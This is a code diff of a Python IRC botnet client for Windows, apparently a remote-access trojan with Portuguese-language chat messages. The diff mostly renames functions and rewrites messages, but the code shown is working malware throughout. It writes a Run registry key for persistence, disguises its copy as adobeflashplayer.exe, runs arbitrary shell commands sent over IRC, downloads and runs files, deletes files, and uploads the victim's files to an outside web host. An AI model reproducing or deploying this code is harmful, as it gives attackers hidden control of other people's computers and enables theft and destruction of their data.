@@ -9,7 +9,7 @@ import os
 import socket # For function conn(): && ipLocal():
 import platform # For variable pcName
 import random # For variable pcName
-import glob # For function listFile(): list files on the computer
+import glob # For function listArq(): list files on the computer
 import re # For function getPublicIp(): Ip Location
 from urllib import urlopen # For function getPublicIp(): Ip Location
 import requests # For function upload(): File Upload
@@ -19,42 +19,38 @@ import time, datetime# For function screenshot():
 
 ircServer= "chat.freenode.net"	# Address Server Irc
 ircChanne= "#amarula424217"			# Channel for Bot connect
-ircPwdCha= ""					# Password of Channel, if there enter the password or leave blank
+ircPwdCha= "zombieland"					# Password of Channel, if there enter the password or leave blank
 botAdmi= "Papa Father"				# A name for the welcome help, Not obligatory.
-botPass= "12345"				# Not obligatory. A name for the welcome help
+botPass= "raise"				# Not obligatory. A name for the welcome help
 dir = "C:\\Users\\Public\\Libraries\\adobeflashplayer.exe"	# Path to where the bot will copy + name it, Use \ double to separate directories: \\
 urlFromUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"		# URL that contains the php ARRAY to receive files via upload
 urlFromUpShow = urlFromUpload.strip('http:upload.php')		# Variable that receives the URL to display uploaded files
 
-def startup():
+def persis():
 	try:
 		conv = os.path.realpath(__file__).replace('.py', '.exe')
-		#pt = sys.path
-		#subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Amarula" /t REG_SZ /F /D '+sys.path[0], shell=True)
 		subprocess.call('REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Amarula" /t REG_SZ /F /D '+conv, shell=True)
-		sendMsg(ircChanne, "Registro alterado com sucesso")
-		#print("Caminho: ", pt)
-		#print()
+		EnviaMsg(ircChanne, "[+] Registro alterado com sucesso [+]")
 	except:
-		sendMsg(ircChanne, "Nao foi possivel alterar o registro")
+		EnviaMsg(ircChanne, "[+] Nao foi possivel alterar o registro [+]")
 def delFileY():
 	try:
 		localisfile = glob.glob(delFile)
 		if os.path.exists(delFile):
 			for localisfile in localisfile:
 				os.unlink(localisfile)
-				sendMsg(ircChanne, "Arquivo deletado  " + "[ " + localisfile + " ]")
+				EnviaMsg(ircChanne, "[+] Arquivo deletado com sucesso  " + "[ " + localisfile + " ] [+]")
 		else:
-			sendMsg(ircChanne, "O arquivo nao existe " + "[ " + delFile + " ]")
+			EnviaMsg(ircChanne, "[!] Ops! O arquivo nao existe " + "[ " + delFile + " ] [!]")
 	except WindowsError:
-		sendMsg(ircChanne, "Nao foi possivel deletar o arquivo, possivelmente voce teve permissao negada")
-		sendMsg(ircChanne, str(WindowsError))
+		EnviaMsg(ircChanne, "[!] Porra! Nao foi possivel deletar o arquivo, provavelmente voce teve permissao negada [!]")
+		EnviaMsg(ircChanne, str(WindowsError))
 def run():
 	if os.path.isfile(str(fileRun)) == True:
 		subprocess.call(['start', fileRun], shell=True)
-		sendMsg(ircChanne, fileRun + " executado com sucesso.")
+		EnviaMsg(ircChanne, fileRun + " executado com sucesso.")
 	else:
-		sendMsg(ircChanne, fileRun + " arquivo nao existe.")
+		EnviaMsg(ircChanne, fileRun + " arquivo nao existe.")
 def download():
 #REFERENCIA http://stackoverflow.com/questions/1096379/how-to-make-urllstarib2-requests-through-tor-in-python
 	if urlDown.find("http://")!= -1 or urlDown.find("https://")!= -1:
@@ -64,63 +60,64 @@ def download():
 			f = open(file_name, 'wb')
 			meta = u.info()
 			file_size = int(meta.getheaders("Content-Length")[0])
-			sendMsg(ircChanne, "Downloading: %s - Tamanho: %s Bytes" % (file_name, file_size))
+			EnviaMsg(ircChanne, "[+] Baixando para o bot: %s - Tamanho: %s Bytes [+]" % (file_name, file_size))
 			f.write(u.read())
 			f.close()
-			sendMsg(ircChanne, "Download completo de: " + str(file_name))
+			EnviaMsg(ircChanne, "[+] Download finalizado de: " + str(file_name) + " [+]")
 		except IOError:
-			sendMsg(ircChanne, "Voce nao tem privilegio para fazer o donwload")
+			EnviaMsg(ircChanne, "[!] Papa, Seu inutil! Voce nao tem privilegio para fazer o download. [!]")
 	else:
-		sendMsg(ircChanne, "Atencao: Falta [http://] OU [https://] na URL ")
+		EnviaMsg(ircChanne, "Ops! Tente usar [http://] ou [https://] na URL")
 def upload():
-	#url = 'http://www.site.com.br/upload.php' #Arry Receber o arquivo
 	global urlFromUpload, urlFromUpShow
 	if os.path.exists(fileUp):
 		files = {'file': open(fileUp, 'rb')}
 		r = requests.post(urlFromUpload, files=files) #import requests
-		sendMsg(ircChanne, "..::Arquivo urpado com sucesso::.. para http:"+urlFromUpShow + fileUp)
+		EnviaMsg(ircChanne, "[+] Upload concluido com sucesso [+] para http:"+urlFromUpShow + fileUp)
 	else:
-		sendMsg(ircChanne, "O arquivo nao existe " + "[ " + fileUp + " ]")
+		EnviaMsg(ircChanne, "[+] Apenas o vazio da existencia: O arquivo nao existe [+]" + "[ " + fileUp + " ]")
 def getPublicIp():
 	data = str(urlopen('http://checkip.dyndns.com/').read())
 	return re.compile(r'Address: (\d+\.\d+\.\d+\.\d+)').search(data).group(1)
 def ipLocal():
 	addresses = [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1]
 	return addresses
-def listFile():
+def listArq():
 	file = glob.glob('*.*')
 	for file in file:
-		sendMsg(ircChanne, "Arquivo: [ " + file + " " + str(os.path.getsize(file)) + " kb ]")
+		EnviaMsg(ircChanne, "Arquivo: [ " + file + " " + str(os.path.getsize(file)) + " kb ]")
 		time.sleep(0.8)
 
 def shell():
-	process = subprocess.Popen(args=comando,stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell= True)
-	outt = (process.communicate())
-	out2 = outt[0] #str(outt.decode('utf-8')) #str(outt.decode())
-	out3 = out2.split('\r\n')
-	for item in (out3):
-		item = item.replace("\x82", "?")
-		item = item.replace("\xc6", "?")
-		item = item.replace("\xa3", "?")
-		item = item.replace("\xa1", "?")
-		item = item.replace("\xa2", "?")
-		item = item.replace("\x87", "?")
-		item = item.replace("\x93", "?")
-		item = item.replace("\xa0", "?")
-		item = item.replace("\x88", "?")
-		item = item.replace("\x83", "?")
-		item = item.replace("\xc7", "?")
-		item = item.replace("\xb8", "?")
-		item = item.replace("\xad", "?")
-		item = item.replace("\xef", "?")
-		item = item.replace("\xa7", "?")
-		item = item.replace("\xf5", "?")
-		item = item.replace("\xf0", "?")
-		item = item.replace("\xfc", "?")
-		item = item.replace("\xa6", "?")
-		sendMsg(ircChanne, item )
-		time.sleep(1)
-
+	try:
+		process = subprocess.Popen(args=comando,stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, shell= True)
+		outt = (process.communicate())
+		out2 = outt[0]
+		out3 = out2.split('\r\n')
+		for item in (out3):
+			item = item.replace("\x82", "?")
+			item = item.replace("\xc6", "?")
+			item = item.replace("\xa3", "?")
+			item = item.replace("\xa1", "?")
+			item = item.replace("\xa2", "?")
+			item = item.replace("\x87", "?")
+			item = item.replace("\x93", "?")
+			item = item.replace("\xa0", "?")
+			item = item.replace("\x88", "?")
+			item = item.replace("\x83", "?")
+			item = item.replace("\xc7", "?")
+			item = item.replace("\xb8", "?")
+			item = item.replace("\xad", "?")
+			item = item.replace("\xef", "?")
+			item = item.replace("\xa7", "?")
+			item = item.replace("\xf5", "?")
+			item = item.replace("\xf0", "?")
+			item = item.replace("\xfc", "?")
+			item = item.replace("\xa6", "?")
+			EnviaMsg(ircChanne, item )
+			time.sleep(1)
+	except:
+		EnviaMsg(ircChanne, "[!] Ocorreu um erro na execucao do comando [!]")
 
 def conn():
 #REFERENCIA http://stackoverflow.com/questions/25616545/python-irc-bot-not-returning-full-list-of-channels
@@ -129,11 +126,11 @@ def conn():
 	except socket.error:
 		conn()
 	else:
-		ircSock.send(str.encode("USER "+ botNick +" "+ botNick +" "+ botNick +" :The Walking Dead\n"))
+		ircSock.send(str.encode("USER "+ botNick +" "+ botNick +" "+ botNick +" :ZuMbI\n"))
 		ircSock.send(str.encode("NICK "+ botNick +"\n"))
 def ping():
 	ircSock.send (str.encode("PONG :pingis\n"))
-def sendMsg(chan, msg):
+def EnviaMsg(chan, msg):
 	ircSock.send(str.encode("PRIVMSG " + chan +" :" + msg + "\n"))
 def join(chan):
 	ircSock.send(str.encode("JOIN " + chan + " " + ircPwdCha + "\n"))
@@ -162,12 +159,12 @@ def main():
 				p = ircMsgClean.split()
 				pwd = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <login> <senha>")
+				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] tente: <login> <senha>")
 			else:
 				if pwd != botPass:
-					sendMsg(ircChanne, "ERROR: Senha Invalida, ou voce nao pode logar")
+					EnviaMsg(ircChanne, "[!] Parado ai, vagabundo: Senha Invalida, ou voce nao pode logar [!]")
 				else:
-					sendMsg(ircChanne, "..::Conectado::.. " + botNick)
+					EnviaMsg(ircChanne, "[+] Conectado: bot " + botNick + " aguardando por ordens, Mestre! [+]")
 					login = True
 	while True:
 		ircMsg = ircSock.recv(5000)
@@ -179,9 +176,9 @@ def main():
 			join(ircChanne)
 		if ircMsg.find(str.encode("PING :")) != -1:
 			ping()
-		elif ircMsg.find(str.encode("leave")) != -1: # Command used for the bot leave the channel, but remains connected to the irc server
+		elif ircMsg.find(str.encode("sair")) != -1: # Command used for the bot leave the channel, but remains connected to the irc server
 			leaveChannel(ircChanne)
-		elif ircMsg.find(str.encode("exit")) != -1: # Command used for kill bot on irc server
+		elif ircMsg.find(str.encode("matar")) != -1: # Command used for kill bot on irc server
 			quitIrc(ircChanne)
 			sys.exit()
 		elif ircMsg.find(str.encode("help")) != -1: # Command used to display help for the user
@@ -189,75 +186,73 @@ def main():
 				p = ircMsgClean.split()
 				id = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <help> <" + botNick +">")
+				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <help> <" + botNick +">")
 			else:
 				if id == botNick:
-					sendMsg(ircChanne, "!!- Bem Vindo -!! " + botAdmi)
+					EnviaMsg(ircChanne, "[+] Bem Vindo, Mestre " + botAdmi + " [+]")
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [exit] para matar os bots ativos")
+					EnviaMsg(ircChanne, "use: [matar]    para matar os bots ativos")
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [leave] para os bots sair do canal")
+					EnviaMsg(ircChanne, "use: [sair]     para que os bots ativos saiam do canal")
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [dir] para vizualizar o diretorio atual do bot")
+					EnviaMsg(ircChanne, "use: [dir]      para vizualizar o diretorio atual do zumbi")
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [ls] para listar o conteudo da pasta atual")
+					EnviaMsg(ircChanne, "use: [ls]       para listar o conteudo da pasta atual")
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [ip] para mostrar o ip da host")
+					EnviaMsg(ircChanne, "use: [ip]       para mostrar os ips do bot")
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [upload] para urpar arquivos")
+					EnviaMsg(ircChanne, "use: [upload]   para fazer upload de arquivos do bot")
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [download] para baixar arquivos para o host")
+					EnviaMsg(ircChanne, "use: [download] para baixar arquivos para o zumbi")
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [run] para executar um programa")
+					EnviaMsg(ircChanne, "use: [run]      para executar um programa")
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [shell] para executar comandos no terminal")
+					EnviaMsg(ircChanne, "use: [shell]    para executar comandos no terminal")
 					time.sleep(1)
-					sendMsg(ircChanne, "use: [delete] para deletar arquivos")
-					time.sleep(1)
-					sendMsg(ircChanne, "use: [blank] 0000000")
+					EnviaMsg(ircChanne, "use: [delete]   para excluir arquivos")
 					time.sleep(1)
 
 		elif ircMsg.find(str.encode("botnick")) != -1: # Command to get bot nickname
-			sendMsg(ircChanne, "Nickname: " + botNick)
+			EnviaMsg(ircChanne, "Nickname: " + botNick)
 		elif ircMsg.find(str.encode("dir")) != -1: # Command to list the current directory of the bot
 			try:
 				p = ircMsgClean.split()
 				id = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <dir> <" + botNick +">")
+				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <dir> <" + botNick +">")
 			else:
 				if id == botNick:
-					sendMsg(ircChanne, "Diretorio atual do bot: " + os.getcwd())
+					EnviaMsg(ircChanne, "[+] Diretorio atual do zumbi: " + os.getcwd())
 		elif ircMsg.find(str.encode("ls")) != -1: # Command to list the files in the current directory
 			try:
 				p = ircMsgClean.split()
 				id = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <ls> <" + botNick +">")
+				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <ls> <" + botNick +">")
 			else:
 				if id == botNick:
-					listFile()
+					listArq()
 		elif ircMsg.find(str.encode("ip")) != -1: # Command to get the host IP
 			try:
 				p = ircMsgClean.split()
 				id = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <ip> <" + botNick +">")
+				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <ip> <" + botNick +">")
 			else:
 				if id == botNick:
 					yx = getPublicIp()
 					xy = ipLocal()
-					sendMsg(ircChanne, "IP Local: " + str(xy) +  " Ip Externo: " + "['" + yx + "']"  )
+					EnviaMsg(ircChanne, "IP Local: " + str(xy) +  " Ip Externo: " + "['" + yx + "']"  )
 		elif ircMsg.find(str.encode("upload")) != -1: # Command to upload files
 			try:
 				p = ircMsgClean.split()
 				fileUp = p[4]
 				id = p[5]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <upload> <Arquivo> <" + botNick +">")
+				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <upload> <Arquivo> <" + botNick +">")
 			else:
 				if fileUp == fileUp and id == botNick:
-					sendMsg(ircChanne, "..::Aguarde Arquivo sendo urpado::..")
+					EnviaMsg(ircChanne, "[+] Upload em andamento, aguarde um pouco. [+]")
 					upload()
 		elif ircMsg.find(str.encode("download")) != -1: # Command to download files to the host
 			try:
@@ -265,8 +260,7 @@ def main():
 				urlDown = p[4]
 				id = p[5]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <download> <link> <" + botNick +">")
-				#sendMsg(ircChanne,  "use: <download> <link> <" + botNick +">")
+				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <download> <link> <" + botNick +">")
 			else:
 				if urlDown == urlDown and id == botNick:
 					download()
@@ -276,7 +270,7 @@ def main():
 				fileRun = p[4]
 				id = p[5]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <run> <programa> <" + botNick +">")
+				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <run> <programa> <" + botNick +">")
 			else:
 				if fileRun == fileRun and id == botNick:
 					run()
@@ -287,7 +281,7 @@ def main():
 				delFile = p[4]
 				id = p[5]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <delete> <arquivo> <" + botNick +">")
+				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <delete> <arquivo> <" + botNick +">")
 			else:
 				if delFile == delFile and id == botNick:
 					delFileY()
@@ -302,7 +296,7 @@ def main():
 
 				id = p[-1]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <shell> <comando> <" + botNick + ">")
+				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <shell> <comando> <" + botNick + ">")
 			else:
 				if comando == comando and id == botNick:
 					shell()
@@ -311,9 +305,9 @@ def main():
 				p = ircMsgClean.split()
 				id = p[4]
 			except IndexError:
-				sendMsg(ircChanne, "..::Sintaxe Invalida::.. use: <persistence> <" + botNick +">")
+				EnviaMsg(ircChanne, "[+] Sintaxe Invalida [+] use: <persistence> <" + botNick +">")
 			else:
 				if id == botNick:
-					startup()
+					persis()
 if __name__ == "__main__":
     main()
